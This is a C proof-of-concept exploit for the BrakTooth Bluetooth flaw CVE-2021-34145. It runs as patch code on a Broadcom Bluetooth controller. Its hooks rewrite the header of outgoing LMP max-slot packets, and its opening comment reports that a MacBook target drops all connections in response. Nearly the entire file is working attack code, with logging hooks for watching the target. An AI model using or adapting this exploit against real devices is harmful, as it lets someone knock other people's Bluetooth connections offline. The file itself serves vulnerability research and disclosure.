/*
PoC for BrakTooth V13: Invalid Max Slot Type
(CVE-2021-34145).

The MacBook terminates all connections.

The iPhone 11+12 have the short hopping artifacts until the LMP
Detach, but no terminated connections.


Testing on a packet-level against the MBP:

len=31: we still receive replies from the MBP but the MBP doesn't receive
        follow-up messages from us.
        TODO do we crash our own modem??

lt_addr=0: we still send messages but the MBP doesn't reply any more.
        same effect as setting all off tx_pkt_info=0.


*/

#include <frankenstein/BCMBT/patching/patchram.h>
#include <frankenstein/BCMBT/patching/hciio.h>
#include <frankenstein/hook.h>


void bcs_dmaTxEnable();
void lm_SendLmpMaxSlot();
void lm_SendLmpAutoRate();
void bcs_utilBbRxPktHdr(void *aclConn, int packet_header);
void bcs_utilBbRxPyldHdr(int payload_header, void *p_log);
void DHM_BasebandRx(int packet_header, void *payload);
void lm_LmpReceived(void *aclptr, void *payload);
void DHM_LMPTx(void *aclptr, void *lmp);


extern int tx_pkt_info;
extern int tx_pkt_pyld_hdr;

void lm_SendLmpMaxSlot_prehook(struct saved_regs *regs, void *arg);
void bcs_utilBbRxPktSetLength_prehook(struct saved_regs *regs, void *arg);
void bcs_utilBbRxPyldHdr_posthook(struct saved_regs *regs, void *arg);
void DHM_BasebandRx_prehook(struct saved_regs *regs, void *arg);
void lm_LmpReceived_prehook(struct saved_regs *regs, void *arg);
void DHM_LMPTx_prehook(struct saved_regs *regs, void *arg);



int counter = 0;
void bcs_dmaTxEnable_set_len(struct saved_regs *regs, void *arg) {
    int len = (*(int *)(regs->r0 + 0x0a)>>3) & 0x3ff;
    char *data = (char *)(*(int *)(regs->r0 + 0x10) & 0xfffffffc);

    if (data[0] >> 1 != 0x2d) return; //max_slots
    tx_pkt_info = (0b11010000) | (tx_pkt_info & 0xff00);  // LT_ADDR = 0b000, Type = 0xa, Flow = 0b1, keep following 8 bit intact
    // only set LT_ADDR to zero
    //tx_pkt_info &= 0xfff8;  // just setting the LT_ADDR to 0 has a similar effect on the modem as setting the len to 31...


    //int set_len = 31;  // TODO adjust LMP length here
    //tx_pkt_pyld_hdr = (set_len << 3) | 0b111;

    counter ++;
}


// the payload header routine accesses the packet header
void bcs_utilBbRxPyldHdr_posthook(struct saved_regs *regs, void *arg) {

    char *packet_header =  (char *)((int *)(regs->r0));

    int lt_addr = packet_header[0] & 0b111;
    int type = (packet_header[0] >> 3) & 0xf;
    // not a NULL (0) or POLL (1) packet -> print info
    // type 3: DM1 ACL
    /*
    if (type>1) {
        print_var(lt_addr);
        print_var(type);
        print_var(packet_header[0]);
        print_var(packet_header[1]);
        print_var(tx_pkt_info); //TODO
    } else {
        print(type);
    }
    */

}

// when we set the length we also have read the payload header
void bcs_utilBbRxPktSetLength_preehok(struct saved_regs *regs, void *arg) {

    char *payload_header =  (char *)((int *)(regs->r0+1));
    int len = payload_header[0] >> 3;
    print_var(len);
    print_var(tx_pkt_info); //TODO

    // test if this would cause overflows
    //payload_header[0] = (31 << 3) | 0b111;
    //print("rx len overwritten and set to 31\n");

}

int packet_header_old = 0;
void DHM_BasebandRx_prehook(struct saved_regs *regs, void *arg) {

    //int packet_header = (*(int *)(regs->r0));
    char *packet_header =  (char *)((int *)(regs->r1+4));
    char *payload =  (char *)((int *)(regs->r2+4));  // as accessed by LMP
    //if (packet_header[0] == packet_header_old) return;
    //packet_header_old = packet_header[0];

    //var hec = (packet_header & 0xff00)>>8
    //packet_header &= 0xff;  // we have an 1b header in this case

    //print_var((opcode & 0xff)>>1);
    print_var(packet_header[0]);
    print_var(payload[0]);
}

// Print received LMP opcodes
// -> make sure target is not dead
void lm_LmpReceived_prehook(struct saved_regs *regs, void *arg) {
    char *payload =  (char *)((int *)(regs->r1+4));
    print_var(payload[0]>>1);
}

void DHM_LMPTx_prehook(struct saved_regs *regs, void *arg) {
    char *lmp_sent =  (char *)((int *)(regs->r1+12));
    print_var(lmp_sent[0]>>1);
}



int _start() {
    print("Hello\n");
     *(int*)0x318038 = rand();
    add_hook(bcs_dmaTxEnable, bcs_dmaTxEnable_set_len, NULL, NULL);
    //trace(lm_SendLmpMaxSlot, 1);
    add_hook(lm_SendLmpMaxSlot, lm_SendLmpMaxSlot_prehook, NULL, NULL);
    add_hook(bcs_utilBbRxPktSetLength, bcs_utilBbRxPktSetLength_preehok, NULL, NULL);
    add_hook(bcs_utilBbRxPyldHdr, bcs_utilBbRxPyldHdr_posthook, NULL, NULL);
    //add_hook(DHM_BasebandRx, DHM_BasebandRx_prehook, NULL, NULL);
    add_hook(lm_LmpReceived, lm_LmpReceived_prehook, NULL, NULL);
    add_hook(DHM_LMPTx, DHM_LMPTx_prehook, NULL, NULL);

    trace(lm_SendLmpAutoRate, 1);
}

// just to have this info printed as hook confirmation
// needs to be here because BCS is time sensitive
void lm_SendLmpMaxSlot_prehook(struct saved_regs *regs, void *arg) {
    print("lm_SendLmpMaxSlot, going to set length...\n");
}

void _fini() {
    print("Goodbye cruel world\n");
    print_ptr(counter);
    print("\n");
    for (int i=0; i < installed_hooks; i++) {
        uninstall_hook(&hooks[i]);
    }
}
